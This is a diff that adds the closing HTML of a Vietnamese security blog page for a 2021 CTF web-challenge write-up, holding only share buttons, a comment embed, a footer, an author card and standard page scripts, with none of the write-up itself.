+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 <a href="https://facebook.com/manhnv.sec">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-web-ministryplace-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web MiniSTRyplace writeup">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/01/i-passed-oswe-nguon-goc-va-suc-manh-tu-tin-va-su-co-gang/" data-tooltip="[I passed OSWE] Nguồn gốc và sức mạnh | Tự tin và sự cố gắng">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-web-starfleet-writeup%2F">
+          <i class="fa fa-facebook-official"></i><span>Chia sẻ với Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-web-starfleet-writeup%2F">
+          <i class="fa fa-twitter"></i><span>Chia sẻ với Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-web-starfleet-writeup%2F">
+          <i class="fa fa-google-plus"></i><span>Chia sẻ với Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+    
+    <h4 id="about-card-name">Manh NV</h4>
+    
+      <div id="about-card-bio">Chia sẻ là niềm vui</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Viết blog dạo
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        VietNam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://manhnv.com/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://manhnv.com/js/scripts.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/manhnv.com\/2021\/04\/cyber-apocalypse-2021-web-starfleet-writeup\/';
+          
+            this.page.identifier = '\/2021\/04\/cyber-apocalypse-2021-web-starfleet-writeup\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'nguyen-manh';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
